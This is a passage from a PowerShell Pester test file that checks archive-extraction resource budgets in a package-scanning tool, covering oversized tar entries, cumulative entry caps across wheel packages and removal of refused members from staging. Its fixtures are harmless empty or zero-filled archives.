                @($zipUnit.Findings | Where-Object { $_.TestID -eq 'MTS-ARCHIVE-BUDGET-EXCEEDED' }).Count | Should -Be 0
            } finally {
                $script:ArchiveTreeMaxBytes = $origMaxBytes
            }
        } finally {
            Remove-Item $tmpDir -Recurse -Force -ErrorAction SilentlyContinue
            Remove-Item $out -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
}

Describe 'Tarball extraction — an oversized entry does not block a later smaller one (review follow-up 5, #9)' {
    It 'continues past a tar entry that does not individually fit and still writes a later smaller one' {
        # The BUG: the same break-vs-continue mistake as
        # Invoke-ArchiveMemberDispatch's per-member loop (review follow-up 5,
        # #7), but in the tar streaming path -- a per-entry byte miss `break`ed
        # the WHOLE remaining stream, even though a later, smaller entry would
        # still fit within remaining headroom on its own. An attacker could
        # place one oversized benign entry right before a small malicious
        # script to keep it from ever being written or analyzed.
        $tmpDir = Join-Path $env:TEMP "mts-p9r1-$(Get-Random)"
        New-Item -ItemType Directory -Path $tmpDir -Force | Out-Null
        $tarPath = Join-Path $tmpDir 'mixed.tgz'
        $fileStream = [System.IO.File]::Create($tarPath)
        $gzipStream = [System.IO.Compression.GZipStream]::new($fileStream, [System.IO.Compression.CompressionMode]::Compress)
        $tarWriter  = [System.Formats.Tar.TarWriter]::new($gzipStream)
        try {
            $bigEntry = [System.Formats.Tar.PaxTarEntry]::new([System.Formats.Tar.TarEntryType]::RegularFile, 'big.bin')
            $bigEntry.DataStream = [System.IO.MemoryStream]::new([byte[]]::new(5000))
            $tarWriter.WriteEntry($bigEntry)

            $smallEntry = [System.Formats.Tar.PaxTarEntry]::new([System.Formats.Tar.TarEntryType]::RegularFile, 'small.txt')
            $smallEntry.DataStream = [System.IO.MemoryStream]::new([System.Text.Encoding]::UTF8.GetBytes('hello'))
            $tarWriter.WriteEntry($smallEntry)
        } finally { $tarWriter.Dispose(); $gzipStream.Dispose(); $fileStream.Dispose() }

        $stage = Join-Path $env:TEMP "mts-p9r1-stage-$(Get-Random)"
        try {
            $budget = New-ArchiveTreeBudget
            $budget.MaxBytes = 100   # big.bin (5000) alone exceeds this; small.txt's own bytes easily fit
            $r = Expand-SubmissionArchive -InputFile $tarPath -OutputDir $stage -Budget $budget

            $r.Success | Should -BeTrue   # stopping early on ONE entry is normal, not an error
            @($r.Findings | Where-Object {
                $_.TestID -eq 'MTS-ARCHIVE-BUDGET-EXCEEDED' -and $_.Issue -match 'big\.bin' }).Count | Should -Be 1
            # small.txt was STILL written -- the stream did not stop at big.bin.
            Test-Path -LiteralPath (Join-Path $stage 'small.txt') | Should -BeTrue
            Test-Path -LiteralPath (Join-Path $stage 'big.bin')   | Should -BeFalse
        } finally {
            Remove-Item $tmpDir -Recurse -Force -ErrorAction SilentlyContinue
            Remove-Item $stage -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
}

Describe 'Invoke-Scan — cumulative entry cap for top-level semantic containers (review follow-up 5, #10)' {
    It 'blocks a later top-level wheel once earlier ones have used up the semantic-container ENTRY budget, even when bytes stay near zero' {
        # The BUG: the cumulative gate (review follow-up 5, #6) checked bytes
        # only (-SkipCountCheck). A package built mostly from empty files or
        # directory entries estimates near-zero bytes regardless of how many
        # real filesystem entries it creates -- the byte gate never trips,
        # and each package's OWN entry-count cap (Test-ZipArchiveHazards,
        # 50,000) is per-archive, not cumulative, so many such packages could
        # still exhaust inodes despite the run-wide byte limit.
        $tmpDir = Join-Path $env:TEMP "mts-p9r2-$(Get-Random)"
        New-Item -ItemType Directory -Path $tmpDir -Force | Out-Null
        $out = Join-Path $env:TEMP "mts-p9r2-out-$(Get-Random)"
        try {
            # Numeric prefixes make discovery order deterministic. Every
            # entry is zero bytes -- only entry COUNT should ever gate these.
            foreach ($name in @('01_pkg.whl', '02_pkg.whl')) {
                $fs = [System.IO.File]::Create((Join-Path $tmpDir $name))
                $za = [System.IO.Compression.ZipArchive]::new($fs, [System.IO.Compression.ZipArchiveMode]::Create)
                try {
                    foreach ($i in 1..20) { $za.CreateEntry("file$i.txt") | Out-Null }
                } finally { $za.Dispose(); $fs.Dispose() }
            }

            $origMaxMembers = $script:ArchiveTreeMaxMembers
            try {
                # Room for ONE package's 20 entries, not two.
                $script:ArchiveTreeMaxMembers = 25
                $r = Invoke-Scan -Path $tmpDir -Profile core -AnalyzerDir $script:Analyzers `
                    -ReportsDir $out -Mode offline

                $pkgUnits = @($r.Units | Where-Object { $_.Name -like '*_pkg.whl' })
                $pkgUnits.Count | Should -Be 2
                $blockedUnits = @($pkgUnits | Where-Object {
                    @($_.Findings | Where-Object {
                        $_.TestID -eq 'MTS-ARCHIVE-BUDGET-EXCEEDED' -and $_.Issue -match 'semantic-container budget' }).Count -gt 0
                })
                # Exactly one hits the cumulative entry cap -- proves the
                # bound is enforced purely on COUNT (bytes never came close
                # to any limit) -- but never both, since the first admitted
                # one must never be starved by this gate on its own.
                $blockedUnits.Count | Should -Be 1
                $notBlockedUnits = @($pkgUnits | Where-Object { $_ -notin $blockedUnits })
                $notBlockedUnits.Count | Should -Be 1
            } finally {
                $script:ArchiveTreeMaxMembers = $origMaxMembers
            }
        } finally {
            Remove-Item $tmpDir -Recurse -Force -ErrorAction SilentlyContinue
            Remove-Item $out -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
}

Describe 'Archive-member dispatch — a budget-refused member is removed from staging (review follow-up 5, #11)' {
    It 'deletes an already-extracted member it refuses, so disk never holds uncharged content' {
        # The BUG: extraction writes the WHOLE archive at once, so every
        # member is already on disk before the member loop runs -- only
        # ANALYSIS is per-member. A member the budget refused was left in
        # place: uncharged bytes still occupying disk. Combined with a
        # nested semantic container's own expansion (charged separately),
        # the retained parent siblings could push real disk usage past the
        # run-wide cap by nearly a full per-archive allowance.
        $stage = Join-Path $env:TEMP "mts-p10r1-$(Get-Random)"
        $workDir = Join-Path $env:TEMP "mts-p10r1-work-$(Get-Random)"
        New-Item -ItemType Directory -Path $stage -Force | Out-Null
        New-Item -ItemType Directory -Path $workDir -Force | Out-Null
        try {
            [System.IO.File]::WriteAllBytes((Join-Path $stage 'big.bin'), [byte[]]::new(5000))
            [System.IO.File]::WriteAllText((Join-Path $stage 'small.txt'), 'hi')

            $context = [PSCustomObject]@{
                Tools = @{}; Venv = $null; Mode = 'offline'; WorkDir = $workDir
                ReportsDir = $script:Out; HelperDir = ''; TimeoutSeconds = 60; AdvisoryDbDate = $null
            }
            $enabled = @((Import-AnalyzerRegistry -AnalyzerDir $script:Analyzers) | Where-Object { $_.DefaultEnabled })
            $unit = [PSCustomObject]@{ Type = 'archive'; Name = 'container.zip'; Path = 'container.zip'
                                        RelativePath = 'container.zip'; StagingPath = $stage }
            $budget = New-ArchiveTreeBudget
            $budget.MaxBytes = 100   # big.bin (5000) is refused; small.txt (2) fits

            Invoke-ArchiveMemberDispatch -ArchiveUnit $unit -Context $context `
                -Enabled $enabled -Budget $budget -Depth 1 | Out-Null

            # The refused member is GONE from staging -- not merely skipped.
            Test-Path -LiteralPath (Join-Path $stage 'big.bin')   | Should -BeFalse
            # ...and the admitted one is untouched.
            Test-Path -LiteralPath (Join-Path $stage 'small.txt') | Should -BeTrue
            # Everything still on disk has been charged: the staging tree's
            # real size never exceeds what the budget was told about.
            $onDisk = (Get-ChildItem -LiteralPath $stage -Recurse -File | Measure-Object -Property Length -Sum).Sum
            $onDisk | Should -BeLessOrEqual $budget.ExpandedBytes
        } finally {
            Remove-Item $stage -Recurse -Force -ErrorAction SilentlyContinue
            Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
}

Describe 'Invoke-Scan — directory-only semantic containers still hit the cumulative entry cap (review follow-up 5, #12)' {
    It 'counts extracted directories toward the semantic-container entry budget' {
        # The BUG: both the pre-extraction estimate and the post-extraction
        # charge counted FILES only. A wheel/egg/.nupkg built purely from
        # explicit directory entries therefore measured zero bytes AND zero
        # entries -- neither the byte gate nor the entry gate ever activated,
        # so arbitrarily many such packages could still exhaust inodes with
        # up to 50,000 directories each (that per-archive cap does not
        # accumulate across packages).
        $tmpDir = Join-Path $env:TEMP "mts-p10r2-$(Get-Random)"
        New-Item -ItemType Directory -Path $tmpDir -Force | Out-Null
        $out = Join-Path $env:TEMP "mts-p10r2-out-$(Get-Random)"
        try {
            # Every entry is a DIRECTORY -- zero files, zero bytes.
            foreach ($name in @('01_pkg.whl', '02_pkg.whl')) {
                $fs = [System.IO.File]::Create((Join-Path $tmpDir $name))
                $za = [System.IO.Compression.ZipArchive]::new($fs, [System.IO.Compression.ZipArchiveMode]::Create)
                try {
                    foreach ($i in 1..20) { $za.CreateEntry("dir$i/") | Out-Null }
                } finally { $za.Dispose(); $fs.Dispose() }
            }

            # Confirm the fixture really is byte-free and file-free -- so a
            # gate that fires can only be firing on the directory count.
            $est = Get-ArchiveExpansionEstimate -Path (Join-Path $tmpDir '01_pkg.whl')
            $est.Bytes        | Should -Be 0
            $est.Count        | Should -Be 0
            $est.TotalEntries | Should -Be 20

            $origMaxMembers = $script:ArchiveTreeMaxMembers
            try {
                $script:ArchiveTreeMaxMembers = 25   # room for ONE package's 20 directories, not two
                $r = Invoke-Scan -Path $tmpDir -Profile core -AnalyzerDir $script:Analyzers `
                    -ReportsDir $out -Mode offline

                $pkgUnits = @($r.Units | Where-Object { $_.Name -like '*_pkg.whl' })
                $pkgUnits.Count | Should -Be 2
                $blockedUnits = @($pkgUnits | Where-Object {
                    @($_.Findings | Where-Object {
                        $_.TestID -eq 'MTS-ARCHIVE-BUDGET-EXCEEDED' -and $_.Issue -match 'semantic-container budget' }).Count -gt 0
                })
                $blockedUnits.Count | Should -Be 1
            } finally {
                $script:ArchiveTreeMaxMembers = $origMaxMembers
            }
        } finally {
            Remove-Item $tmpDir -Recurse -Force -ErrorAction SilentlyContinue
            Remove-Item $out -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
}
